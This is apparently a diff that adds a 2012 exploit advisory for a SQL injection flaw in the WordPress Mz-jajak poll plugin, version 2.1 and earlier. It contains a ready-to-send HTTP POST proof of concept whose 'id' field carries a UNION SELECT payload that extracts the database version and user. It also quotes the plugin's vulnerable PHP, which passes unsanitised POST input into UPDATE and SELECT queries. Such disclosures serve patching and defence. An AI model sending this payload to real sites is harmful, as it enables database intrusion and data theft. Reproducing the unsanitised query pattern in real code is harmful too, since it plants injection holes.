@@ -1,0 +1,43 @@
+# Exploit Title: WordPress Mz-jajak plugin <= 2.1 SQL Injection Vulnerability
+# Date: 2012-08-10
+# Author: StRoNiX
+# E-mail: hacker@hotmail.rs
+# Software Link: http://downloads.wordpress.org/plugin/mz-jajak.zip
+# Version: 2.1 (tested)
+
+
+---------------
+PoC (POST data)
+---------------
+POST /index.php HTTP/1.1
+User-Agent: Mozilla
+Host: example.com
+Accept: */*
+Referer: http://example.com/?page_id=9
+Connection: Keep-Alive
+Content-Length: 111
+Content-Type: application/x-www-form-urlencoded
+
+answer=1&formvote=Y&id=1 AND 1=0 UNION ALL SELECT 1,2,version(),user(),5,6,7,8,9,10,11,12,13,14,15--+&x=10&y=12
+
+
+---------------
+Vulnerable code
+---------------
+$id=$_POST['id'];    
+...
+$query = $wpdb->query("UPDATE " . $table_name . " SET ".$answert."=".$answert."+1 WHERE id=".$id);
+                }
+                $rows = $wpdb->get_results("SELECT * FROM " . $table_name . " WHERE id=".$id);
+
+
+
+###########################################################
+Greetz: T0r3x, m1l05, JuMp-Er, EsC, UNICORN, Xermes, s4r4d0
+
+----------------------------snip--------------------------------------
+
+Thanks,
+~StRoNiX
+
+ 		 	   		  
